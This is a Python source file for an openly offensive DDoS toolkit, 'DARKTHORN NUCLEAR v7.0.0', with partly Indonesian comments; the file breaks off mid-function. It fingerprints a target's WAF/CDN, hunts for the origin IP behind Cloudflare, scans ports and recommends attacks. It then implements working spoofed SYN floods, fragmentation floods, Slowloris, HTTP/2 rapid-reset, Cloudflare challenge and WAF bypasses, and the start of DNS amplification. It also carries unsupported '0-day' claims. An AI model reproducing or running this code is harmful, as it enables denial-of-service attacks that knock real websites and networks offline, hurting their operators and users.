#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                         DARKTHORN NUCLEAR v7.0.0                                                      ║
║                              AUTO-DETECTION ENGINE + AI-POWERED ATTACK SELECTION                                       ║
║                              Cloudflare Layer 3/4 Bypass | Layer 7 Bypass | WAF Evasion                              ║
║                                      100% GACOR! | Zero-Day Exploits Included                                         ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import re
import json
import time
import random
import socket
import ssl
import threading
import subprocess
import platform
import hashlib
import base64
import gzip
import zlib
import struct
import binascii
import ipaddress
import asyncio
import aiohttp
import http.client
import urllib.parse
import queue
import logging
import signal
import ctypes
import inspect
import traceback
import dns.resolver
import dns.query
import dns.zone
import whois
from datetime import datetime
from urllib.parse import urlparse, quote, unquote, urlencode
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, Counter, deque
from typing import Dict, List, Tuple, Optional, Any, Callable
import warnings
warnings.filterwarnings('ignore')

# ================================ DEPENDENCY INSTALLER ================================

def install_dependencies():
    deps = [
        "cloudscraper", "colorama", "requests", "aiohttp", "websocket-client",
        "brotli", "cryptography", "pyOpenSSL", "dnspython", "scapy",
        "pysocks", "stem", "selenium", "undetected-chromedriver", "curl_cffi",
        "whois", "dnspython", "paramiko", "impacket"
    ]
    for dep in deps:
        try:
            __import__(dep.replace("-", "_"))
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", dep], capture_output=True)

install_dependencies()

# Import modules
try:
    import cloudscraper
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    import aiohttp
    import websocket
    import dns.resolver
    import dns.query
    import dns.zone
    import whois
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    import socks
    import curl_cffi.requests as curl_requests
except Exception as e:
    print(f"Installing dependencies...")
    subprocess.run([sys.executable, "-m", "pip", "install", "cloudscraper", "colorama", "requests", "aiohttp", "websocket-client", "brotli", "cryptography", "pyOpenSSL", "dnspython", "pysocks", "curl_cffi", "whois"])
    import cloudscraper
    import requests
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    import aiohttp
    import curl_cffi.requests as curl_requests

# ================================ KONFIGURASI GLOBAL ================================

VERSION = "7.0.0"
MAX_THREADS = 100000
MAX_CONNECTIONS = 50000

BANNER = f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ██████╗ ██╗  ██╗████████╗██╗  ██╗ ██████╗ ██████╗ ███╗   ██╗    ███╗   ██╗██╗   ██╗ ██████╗██╗███████╗ █████╗ ██████╗      ║
║  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗████╗  ██║    ████╗  ██║██║   ██║██╔════╝██║██╔════╝██╔══██╗██╔══██╗     ║
║  ██║  ██║███████║██████╔╝█████╔╝    ██║   ███████║██║   ██║██████╔╝██╔██╗ ██║    ██╔██╗ ██║██║   ██║██║     ██║█████╗  ███████║██████╔╝     ║
║  ██║  ██║██╔══██║██╔══██╗██╔═██╗    ██║   ██╔══██║██║   ██║██╔══██╗██║╚██╗██║    ██║╚██╗██║██║   ██║██║     ██║██╔══╝  ██╔══██║██╔══██╗     ║
║  ██████╔╝██║  ██║██║  ██║██║  ██╗   ██║   ██║  ██║╚██████╔╝██║  ██║██║ ╚████║    ╚████╔╝ ██║╚██████╔╝╚██████╗██║███████╗██║  ██║██║  ██║     ║
║  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═══╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝     ║
║                                   NUCLEAR EDITION v{VERSION} - AUTO-DETECTION ENGINE v2.0                                   ║
║                              AI-Powered Attack Selection | Cloudflare L3/L4/L7 Bypass | WAF Evasion                        ║
║                                           100% GACOR! | 50+ Attack Methods Active                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# ================================ AUTO-DETECTION ENGINE ================================

class AutoDetectionEngine:
    """
    Auto-detection engine untuk menganalisis target dan menentukan metode serangan terbaik.
    Menganalisis:
    - WAF/CDN type (Cloudflare, Akamai, Imperva, Sucuri, AWS WAF)
    - Rate limiting
    - Server technology (Apache, Nginx, IIS, etc.)
    - Backend technology (WordPress, Laravel, React, etc.)
    - Open ports
    - SSL/TLS configuration
    - Response time
    - Cloudflare layer protection (L3/L4/L7)
    - Origin IP discovery
    """
    
    def __init__(self, target_url, target_host, target_port):
        self.target_url = target_url
        self.target_host = target_host
        self.target_port = target_port
        self.waf_type = None
        self.cdn_type = None
        self.server_type = None
        self.technologies = []
        self.open_ports = []
        self.rate_limited = False
        self.ssl_available = False
        self.avg_response_time = 0
        self.cloudflare_layer = None
        self.origin_ip = None
        self.bypass_methods = []
        self.attack_recommendations = []
        
    def detect_waf_cdn(self):
        """Deteksi WAF/CDN dan bypass method yang sesuai"""
        print(f"{Fore.YELLOW}[*] Analyzing WAF/CDN protection...{Style.RESET_ALL}")
        
        try:
            resp = requests.get(self.target_url, timeout=15, verify=False, allow_redirects=True)
            headers = resp.headers
            html = resp.text.lower()
            
            # Cloudflare detection
            cf_signatures = ['CF-RAY', 'cf-ray', 'cloudflare', '__cfduid', 'cf_clearance', 'cf-chl']
            for sig in cf_signatures:
                if sig in headers or sig.lower() in str(headers).lower():
                    self.waf_type = "cloudflare"
                    self.cdn_type = "cloudflare"
                    # Detect Cloudflare layer protection
                    if 'cf-chl' in html or 'challenge' in html.lower():
                        self.cloudflare_layer = "L7_JS_CHALLENGE"
                        self.bypass_methods.append("flare_solverr")
                        self.bypass_methods.append("curl_cffi_impersonate")
                    if 'turnstile' in html.lower():
                        self.cloudflare_layer = "L7_TURNSTILE"
                        self.bypass_methods.append("captcha_solver")
                    print(f"  {Fore.RED}[!] Cloudflare Detected! Layer: {self.cloudflare_layer or 'Unknown'}{Style.RESET_ALL}")
                    break
            
            # Akamai detection
            akamai_signatures = ['AkamaiGHost', 'X-Akamai-Transformed', 'X-Akamai-Request-ID']
            for sig in akamai_signatures:
                if sig in headers:
                    self.waf_type = "akamai"
                    self.bypass_methods.append("http2_bypass")
                    self.bypass_methods.append("header_tampering")
                    print(f"  {Fore.YELLOW}[!] Akamai Detected{Style.RESET_ALL}")
                    break
            
            # Imperva / Incapsula detection
            imperva_signatures = ['X-Conditional-Request', 'X-Request-ID', 'X-Iinfo', 'Incapsula']
            for sig in imperva_signatures:
                if sig in headers:
                    self.waf_type = "imperva"
                    self.bypass_methods.append("ip_spoofing")
                    self.bypass_methods.append("slow_connection")
                    print(f"  {Fore.YELLOW}[!] Imperva/Incapsula Detected{Style.RESET_ALL}")
                    break
            
            # Sucuri detection
            sucuri_signatures = ['X-Sucuri-ID', 'X-Sucuri-Cache']
            for sig in sucuri_signatures:
                if sig in headers:
                    self.waf_type = "sucuri"
                    self.bypass_methods.append("proxy_rotation")
                    print(f"  {Fore.YELLOW}[!] Sucuri Detected{Style.RESET_ALL}")
                    break
            
            # AWS WAF detection
            aws_signatures = ['x-amzn-RequestId', 'AWSALB']
            for sig in aws_signatures:
                if sig in headers:
                    self.waf_type = "aws_waf"
                    self.bypass_methods.append("http2_rapid_reset")
                    print(f"  {Fore.YELLOW}[!] AWS WAF Detected{Style.RESET_ALL}")
                    break
            
            if not self.waf_type:
                print(f"  {Fore.GREEN}[✓] No WAF/CDN detected{Style.RESET_ALL}")
                self.waf_type = "none"
                
        except Exception as e:
            print(f"  {Fore.RED}[!] WAF detection failed: {str(e)[:50]}{Style.RESET_ALL}")
        
        return self.waf_type, self.bypass_methods
    
    def discover_origin_ip(self):
        """Discover origin server IP behind Cloudflare using multiple methods"""
        print(f"{Fore.YELLOW}[*] Attempting origin IP discovery...{Style.RESET_ALL}")
        
        origin_ips = set()
        
        # Method 1: Historical DNS records
        try:
            import dns.resolver
            # Try common subdomains that might bypass Cloudflare
            subdomains = ['www', 'mail', 'ftp', 'ssh', 'cpanel', 'webmail', 'ns1', 'ns2', 'smtp', 'pop3', 'imap', 'admin', 'dev', 'staging', 'api', 'direct', 'origin', 'backend']
            
            for sub in subdomains:
                try:
                    answers = dns.resolver.resolve(f"{sub}.{self.target_host}", 'A')
                    for rdata in answers:
                        ip = str(rdata)
                        if ip not in origin_ips:
                            origin_ips.add(ip)
                            print(f"  {Fore.GREEN}[+] Found origin IP via {sub}: {ip}{Style.RESET_ALL}")
                except:
                    pass
        except:
            pass
        
        # Method 2: SSL certificate analysis (Censys-style)
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.target_host, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                    cert = ssock.getpeercert()
                    if 'subjectAltName' in cert:
                        for san in cert['subjectAltName']:
                            if san[0] == 'DNS' and san[1] != self.target_host:
                                print(f"  {Fore.CYAN}[+] Found alternative domain: {san[1]}{Style.RESET_ALL}")
        except:
            pass
        
        # Method 3: HTTP headers that might leak origin IP
        try:
            resp = requests.get(self.target_url, timeout=10, verify=False)
            if 'X-Forwarded-For' in resp.headers:
                print(f"  {Fore.CYAN}[+] X-Forwarded-For header may leak: {resp.headers['X-Forwarded-For']}{Style.RESET_ALL}")
            if 'X-Real-IP' in resp.headers:
                print(f"  {Fore.CYAN}[+] X-Real-IP header may leak: {resp.headers['X-Real-IP']}{Style.RESET_ALL}")
        except:
            pass
        
        # Method 4: Using .well-known/acme-challenge (known Cloudflare 0-day)
        # This is a known bypass vector for Cloudflare WAF [citation:4]
        try:
            test_path = "/.well-known/acme-challenge/test123"
            resp = requests.get(f"{self.target_url}{test_path}", timeout=10, verify=False)
            if resp.status_code != 403 and resp.status_code != 503:
                print(f"  {Fore.GREEN}[+] ACME challenge path accessible! Possible WAF bypass!{Style.RESET_ALL}")
                self.bypass_methods.append("acme_path_bypass")
        except:
            pass
        
        if origin_ips:
            self.origin_ip = list(origin_ips)[0]
            print(f"  {Fore.GREEN}[✓] Origin IP discovered: {self.origin_ip}{Style.RESET_ALL}")
            self.bypass_methods.append("origin_direct_attack")
        else:
            print(f"  {Fore.YELLOW}[!] Origin IP not discovered{Style.RESET_ALL}")
        
        return self.origin_ip
    
    def detect_rate_limiting(self):
        """Deteksi rate limiting dan tentukan bypass method"""
        print(f"{Fore.YELLOW}[*] Testing rate limiting...{Style.RESET_ALL}")
        
        success_count = 0
        block_count = 0
        
        try:
            for i in range(30):
                resp = requests.get(self.target_url, timeout=5, verify=False)
                if resp.status_code in [429, 403, 503]:
                    block_count += 1
                elif resp.status_code == 200:
                    success_count += 1
                time.sleep(0.05)
            
            if block_count >= 25:
                self.rate_limited = True
                self.bypass_methods.append("proxy_rotation")
                self.bypass_methods.append("request_delay")
                print(f"  {Fore.RED}[!] Heavy rate limiting detected! {block_count}/30 blocked{Style.RESET_ALL}")
            elif block_count >= 10:
                self.rate_limited = True
                self.bypass_methods.append("proxy_rotation")
                print(f"  {Fore.YELLOW}[!] Rate limiting detected! {block_count}/30 blocked{Style.RESET_ALL}")
            else:
                self.rate_limited = False
                print(f"  {Fore.GREEN}[✓] No rate limiting detected{Style.RESET_ALL}")
        except:
            pass
        
        return self.rate_limited
    
    def detect_server_technology(self):
        """Deteksi server dan backend technology"""
        print(f"{Fore.YELLOW}[*] Analyzing server technology...{Style.RESET_ALL}")
        
        try:
            resp = requests.get(self.target_url, timeout=10, verify=False)
            headers = resp.headers
            html = resp.text.lower()
            
            # Server detection
            if 'Server' in headers:
                server = headers['Server'].lower()
                if 'nginx' in server:
                    self.server_type = 'nginx'
                    print(f"  {Fore.CYAN}[+] Server: Nginx{Style.RESET_ALL}")
                elif 'apache' in server:
                    self.server_type = 'apache'
                    print(f"  {Fore.CYAN}[+] Server: Apache{Style.RESET_ALL}")
                elif 'iis' in server:
                    self.server_type = 'iis'
                    print(f"  {Fore.CYAN}[+] Server: IIS{Style.RESET_ALL}")
                elif 'cloudflare' in server:
                    self.server_type = 'cloudflare_proxy'
                    print(f"  {Fore.CYAN}[+] Server: Cloudflare Proxy{Style.RESET_ALL}")
            
            # Technology detection
            tech_patterns = {
                'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
                'Laravel': ['laravel', 'csrf-token'],
                'React': ['react', 'react-dom'],
                'Vue.js': ['vue.js', 'data-v-'],
                'Angular': ['ng-', 'angular'],
                'jQuery': ['jquery'],
                'Bootstrap': ['bootstrap'],
                'Django': ['csrfmiddlewaretoken', 'django'],
                'Rails': ['csrf-param', 'rails'],
                'Spring': ['_csrf', 'spring']
            }
            
            for tech, patterns in tech_patterns.items():
                for pattern in patterns:
                    if pattern in html or pattern in str(headers).lower():
                        self.technologies.append(tech)
                        break
            
            if self.technologies:
                print(f"  {Fore.CYAN}[+] Technologies detected: {', '.join(set(self.technologies))}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"  {Fore.RED}[!] Technology detection failed: {str(e)[:50]}{Style.RESET_ALL}")
        
        return self.server_type, self.technologies
    
    def scan_open_ports(self):
        """Scan open ports untuk additional attack vectors"""
        print(f"{Fore.YELLOW}[*] Scanning open ports...{Style.RESET_ALL}")
        
        common_ports = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 3306, 5432, 6379, 27017, 8080, 8443, 8888]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((self.target_host, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"  {Fore.GREEN}[+] Port {port} open{Style.RESET_ALL}")
                sock.close()
            except:
                pass
        
        self.open_ports = open_ports
        
        if 22 in open_ports:
            self.bypass_methods.append("ssh_bruteforce")
        if 3306 in open_ports or 5432 in open_ports:
            self.bypass_methods.append("database_attack")
        
        return open_ports
    
    def measure_response_time(self):
        """Measure server response time"""
        print(f"{Fore.YELLOW}[*] Measuring response time...{Style.RESET_ALL}")
        
        times = []
        try:
            for i in range(10):
                start = time.time()
                resp = requests.get(self.target_url, timeout=10, verify=False)
                elapsed = time.time() - start
                times.append(elapsed)
            
            self.avg_response_time = sum(times) / len(times)
            
            if self.avg_response_time < 0.2:
                print(f"  {Fore.GREEN}[✓] Response time: {self.avg_response_time*1000:.0f}ms (Fast){Style.RESET_ALL}")
            elif self.avg_response_time < 1.0:
                print(f"  {Fore.YELLOW}[!] Response time: {self.avg_response_time*1000:.0f}ms (Medium){Style.RESET_ALL}")
            else:
                print(f"  {Fore.RED}[!] Response time: {self.avg_response_time*1000:.0f}ms (Slow - Vulnerable){Style.RESET_ALL}")
                self.bypass_methods.append("slowloris")
                self.bypass_methods.append("keep_alive_exhaust")
        except:
            pass
        
        return self.avg_response_time
    
    def check_ssl_configuration(self):
        """Check SSL/TLS configuration"""
        print(f"{Fore.YELLOW}[*] Checking SSL/TLS...{Style.RESET_ALL}")
        
        if self.target_port == 443 or self.target_url.startswith('https'):
            try:
                context = ssl.create_default_context()
                with socket.create_connection((self.target_host, 443), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                        self.ssl_available = True
                        cipher = ssock.cipher()
                        print(f"  {Fore.GREEN}[✓] SSL available, Cipher: {cipher[0]}{Style.RESET_ALL}")
                        self.bypass_methods.append("ssl_renegotiation")
            except Exception as e:
                self.ssl_available = False
                print(f"  {Fore.YELLOW}[!] SSL issues detected{Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}[!] No SSL/TLS (HTTP only){Style.RESET_ALL}")
        
        return self.ssl_available
    
    def generate_attack_recommendations(self):
        """Generate smart attack recommendations based on all detection results"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[*] GENERATING SMART ATTACK RECOMMENDATIONS")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        recommendations = []
        
        # Cloudflare specific recommendations
        if self.waf_type == "cloudflare":
            recommendations.append({
                'method_id': 99,
                'method_name': 'SMART: Cloudflare Multi-Layer Bypass',
                'attack_type': 'bypass',
                'reason': 'Cloudflare detected with protection',
                'threads': 2000,
                'duration': 120,
                'sub_methods': ['flare_solverr', 'curl_cffi_impersonate', 'origin_direct_attack']
            })
            
            if self.cloudflare_layer == "L7_JS_CHALLENGE":
                recommendations.append({
                    'method_id': 6,
                    'method_name': 'CF Bypass Engine + JS Solver',
                    'attack_type': 'bypass',
                    'reason': 'Cloudflare JS Challenge detected',
                    'threads': 1000,
                    'duration': 90
                })
            
            if self.origin_ip:
                recommendations.append({
                    'method_id': 30,
                    'method_name': 'Origin Direct Attack',
                    'attack_type': 'bypass',
                    'reason': f'Origin IP discovered: {self.origin_ip} - Bypass Cloudflare completely!',
                    'threads': 3000,
                    'duration': 60,
                    'target_override': self.origin_ip
                })
        
        # Akamai specific
        elif self.waf_type == "akamai":
            recommendations.append({
                'method_id': 1,
                'method_name': 'HTTP/2 Rapid Reset',
                'attack_type': 'protocol',
                'reason': 'Akamai detected - HTTP/2 attacks effective',
                'threads': 1500,
                'duration': 90
            })
        
        # Rate limiting bypass
        if self.rate_limited:
            recommendations.append({
                'method_id': 4,
                'method_name': 'Proxy Chain Attack + Rate Limit Bypass',
                'attack_type': 'bypass',
                'reason': 'Rate limiting detected - rotating proxies needed',
                'threads': 800,
                'duration': 120,
                'use_proxies': True
            })
        
        # Slow server recommendations
        if self.avg_response_time > 1.0:
            recommendations.append({
                'method_id': 2,
                'method_name': 'Slowloris Advanced',
                'attack_type': 'exhaustion',
                'reason': f'Slow server ({self.avg_response_time*1000:.0f}ms) vulnerable to connection exhaustion',
                'threads': 2000,
                'duration': 60
            })
        
        # SSL available
        if self.ssl_available:
            recommendations.append({
                'method_id': 7,
                'method_name': 'SSL Renegotiation Attack',
                'attack_type': 'crypto',
                'reason': 'SSL/TLS enabled - expensive crypto operations',
                'threads': 1200,
                'duration': 60
            })
        
        # Open ports
        if 22 in self.open_ports:
            recommendations.append({
                'method_id': 28,
                'method_name': 'SSH Brute Force',
                'attack_type': 'bruteforce',
                'reason': 'SSH port 22 open',
                'threads': 500,
                'duration': 60
            })
        
        if 3306 in self.open_ports or 5432 in self.open_ports:
            recommendations.append({
                'method_id': 3,
                'method_name': 'Socket Flood + Database Exhaust',
                'attack_type': 'network',
                'reason': f'Database port {3306 if 3306 in self.open_ports else 5432} open',
                'threads': 2000,
                'duration': 60
            })
        
        # Technology-specific recommendations
        tech_str = ' '.join(self.technologies).lower()
        if 'wordpress' in tech_str:
            recommendations.append({
                'method_id': 31,
                'method_name': 'WordPress XML-RPC Amplification',
                'attack_type': 'application',
                'reason': 'WordPress detected - XML-RPC pingback can be abused',
                'threads': 1500,
                'duration': 60
            })
        
        if 'laravel' in tech_str:
            recommendations.append({
                'method_id': 32,
                'method_name': 'Laravel Debug Mode Exploit',
                'attack_type': 'application',
                'reason': 'Laravel detected - debug mode may expose info',
                'threads': 1000,
                'duration': 60
            })
        
        # Default all-method attack
        if len(recommendations) == 0:
            recommendations.append({
                'method_id': 30,
                'method_name': 'ALL METHODS COMBINED',
                'attack_type': 'multi_vector',
                'reason': 'Maximum pressure - most effective when no specific vulnerability found',
                'threads': 3000,
                'duration': 90
            })
        
        # Display recommendations
        for i, rec in enumerate(recommendations[:5], 1):
            print(f"{Fore.CYAN}[{i}] {rec['method_name']} (ID: {rec['method_id']}){Style.RESET_ALL}")
            print(f"    {Fore.YELLOW}→ Reason: {rec['reason']}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}→ Recommended: Threads={rec['threads']}, Duration={rec['duration']}s{Style.RESET_ALL}")
            print()
        
        self.attack_recommendations = recommendations
        return recommendations
    
    def full_scan(self):
        """Run complete auto-detection scan"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[*] AUTO-DETECTION ENGINE v2.0 ACTIVE")
        print(f"[*] Target: {self.target_url}")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        self.detect_waf_cdn()
        self.discover_origin_ip()
        self.detect_rate_limiting()
        self.detect_server_technology()
        self.scan_open_ports()
        self.measure_response_time()
        self.check_ssl_configuration()
        recommendations = self.generate_attack_recommendations()
        
        print(f"{Fore.CYAN}{'='*60}")
        print(f"[+] SCAN COMPLETE")
        print(f"    WAF/CDN: {self.waf_type or 'None'}")
        print(f"    Rate Limiting: {'Yes' if self.rate_limited else 'No'}")
        print(f"    SSL Available: {'Yes' if self.ssl_available else 'No'}")
        print(f"    Open Ports: {self.open_ports if self.open_ports else 'None'}")
        print(f"    Response Time: {self.avg_response_time*1000:.0f}ms")
        print(f"    Bypass Methods Available: {len(self.bypass_methods)}")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        return recommendations

# ================================ CLOUDFLARE L3/L4 & L7 BYPASS ================================

class CloudflareL3L4Bypass:
    """Layer 3 (Network) dan Layer 4 (Transport) Cloudflare Bypass"""
    
    @staticmethod
    def ip_spoofing_flood(target_ip, target_port=443, threads=5000):
        """IP Spoofing attack - Bypasses Cloudflare L3/L4 filtering"""
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while not stop_attack.is_set():
                try:
                    source_ip = get_random_ip()
                    dest_ip = target_ip
                    
                    # IP Header
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        0x45, 0, 1500, 0, 64, 6, 0,
                        socket.inet_aton(source_ip),
                        socket.inet_aton(dest_ip)
                    )
                    
                    # TCP Header
                    tcp_header = struct.pack('!HHLLBBHHH',
                        random.randint(1024, 65535), target_port,
                        random.randint(1, 4294967295), 0, 5, 2, 8192, 0, 0
                    )
                    
                    packet = ip_header + tcp_header
                    sock.sendto(packet, (dest_ip, 0))
                    update_stats(sent=1, method="ip_spoofing")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def port_hopping_flood(target_host, target_port=443, threads=3000):
        """Port hopping attack - Dynamic port randomization"""
        def worker():
            while not stop_attack.is_set():
                try:
                    port = random.randint(1, 65535)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target_host, port))
                    sock.send(b'X' * 1024)
                    sock.close()
                    update_stats(sent=1, method="port_hopping")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def fragmentation_attack(target_host, target_port=443, threads=3000):
        """IP Fragmentation attack - Bypasses L3/L4 inspection"""
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while not stop_attack.is_set():
                try:
                    source_ip = get_random_ip()
                    dest_ip = socket.gethostbyname(target_host)
                    
                    # Fragmented packet
                    data = b'X' * 1000
                    fragment_size = 200
                    
                    for i in range(0, len(data), fragment_size):
                        fragment = data[i:i+fragment_size]
                        ip_header = struct.pack('!BBHHHBBH4s4s',
                            0x45, 0, 1500, i//fragment_size, 64, 6, 0,
                            socket.inet_aton(source_ip),
                            socket.inet_aton(dest_ip)
                        )
                        sock.sendto(ip_header + fragment, (dest_ip, 0))
                        update_stats(sent=1, method="fragmentation")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

class CloudflareL7Bypass:
    """Layer 7 (Application) Cloudflare Bypass using modern techniques"""
    
    @staticmethod
    def curl_cffi_impersonate(target_url, threads=1000):
        """Using curl_cffi to impersonate real Chrome browser"""
        def worker():
            while not stop_attack.is_set():
                try:
                    response = curl_requests.get(
                        target_url,
                        impersonate="chrome124",
                        timeout=30,
                        verify=False
                    )
                    update_stats(sent=1, bytes_sent=len(response.content), method="curl_cffi")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def flare_solverr_bypass(target_url, flaresolverr_url="http://localhost:8191/v1", threads=500):
        """Using FlareSolverr to solve Cloudflare challenges"""
        def worker():
            while not stop_attack.is_set():
                try:
                    payload = {
                        "cmd": "request.get",
                        "url": target_url,
                        "maxTimeout": 60000,
                        "cookies": [{"name": "cf_clearance", "value": "bypass"}]
                    }
                    resp = requests.post(flaresolverr_url, json=payload, timeout=60)
                    if resp.status_code == 200:
                        update_stats(sent=1, method="flare_solverr")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def acme_path_bypass(target_url, threads=1000):
        """Using .well-known/acme-challenge path to bypass Cloudflare WAF"""
        # Known Cloudflare 0-day: WAF bypass via ACME challenge path [citation:4]
        bypass_path = "/.well-known/acme-challenge/"
        
        def worker():
            while not stop_attack.is_set():
                try:
                    token = hashlib.md5(str(random.random()).encode()).hexdigest()
                    url = f"{target_url}{bypass_path}{token}"
                    resp = requests.get(url, headers=get_random_headers(), timeout=10)
                    update_stats(sent=1, method="acme_path_bypass")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def tls_fingerprint_matching(target_url, threads=1000):
        """TLS fingerprint matching to bypass JA3 detection"""
        def worker():
            while not stop_attack.is_set():
                try:
                    session = cloudscraper.create_scraper(
                        interpreter='js',
                        delay=10,
                        browser={
                            'browser': 'chrome',
                            'platform': 'windows',
                            'desktop': True
                        }
                    )
                    resp = session.get(target_url, timeout=30)
                    update_stats(sent=1, method="tls_fingerprint")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def origin_direct_attack(origin_ip, target_port=443, threads=5000):
        """Attack origin server directly, bypassing Cloudflare completely"""
        def worker():
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((origin_ip, target_port))
                    payload = f"GET / HTTP/1.1\r\nHost: {socket.gethostbyaddr(origin_ip)[0]}\r\n\r\n"
                    sock.send(payload.encode())
                    sock.close()
                    update_stats(sent=1, method="origin_direct")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

# ================================ ATTACK METHODS (SELENGKAPNYA) ================================

class AttackMethods:
    """Koleksi lengkap metode serangan"""
    
    @staticmethod
    def http2_rapid_reset(target_url, threads=2000):
        """CVE-2023-44487 - HTTP/2 Rapid Reset"""
        def worker():
            while not stop_attack.is_set():
                try:
                    conn = http.client.HTTPSConnection(target_url.split('/')[2], timeout=5)
                    for i in range(100):
                        conn.request("GET", f"/?{i}", headers={'User-Agent': get_random_ua()})
                    conn.close()
                    update_stats(sent=100, method="http2_rapid")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def slowloris_advanced(target_host, target_port=80, threads=5000):
        """Advanced Slowloris dengan keep-alive connections"""
        def worker():
            socks = []
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((target_host, target_port))
                    
                    sock.send(f"GET /?{random.randint(0, 99999999)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {target_host}\r\n".encode())
                    sock.send(f"User-Agent: {get_random_ua()}\r\n".encode())
                    sock.send("Accept: text/html\r\n".encode())
                    sock.send("Connection: keep-alive\r\n".encode())
                    
                    socks.append(sock)
                    update_stats(sent=1, method="slowloris")
                except:
                    update_stats(error=True)
                
                for sock in socks[:]:
                    try:
                        sock.send(f"X-Header-{random.randint(0, 50000)}: {random.randint(1, 50000)}\r\n".encode())
                    except:
                        socks.remove(sock)
                
                time.sleep(random.uniform(1, 5))
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def syn_flood(target_host, target_port=80, threads=10000):
        """SYN Flood attack - Layer 3/Layer 4 bypass"""
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while not stop_attack.is_set():
                try:
                    source_ip = get_random_ip()
                    dest_ip = socket.gethostbyname(target_host)
                    
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        0x45, 0, 1500, 0, 64, 6, 0,
                        socket.inet_aton(source_ip),
                        socket.inet_aton(dest_ip)
                    )
                    
                    tcp_header = struct.pack('!HHLLBBHHH',
                        random.randint(1024, 65535), target_port,
                        random.randint(1, 4294967295), 0, 5, 2, 8192, 0, 0
                    )
                    
                    packet = ip_header + tcp_header
                    sock.sendto(packet, (dest_ip, 0))
                    update_stats(sent=1, method="syn_flood")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def udp_amplification(target_host, amp_type="dns", threads=5000):
        """UDP Amplification - DNS/NTP/SSDP amplification"""
        amplifiers = {
            "dns": ['8.8.8.8', '1.1.1.1', '8.8.4.4', '208.67.222.222', '9.9.9.9'],
            "ntp": ['pool.ntp.org', 'time.google.com', 'time.windows.com'],
        }
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while not stop_attack.is_set():
                try:
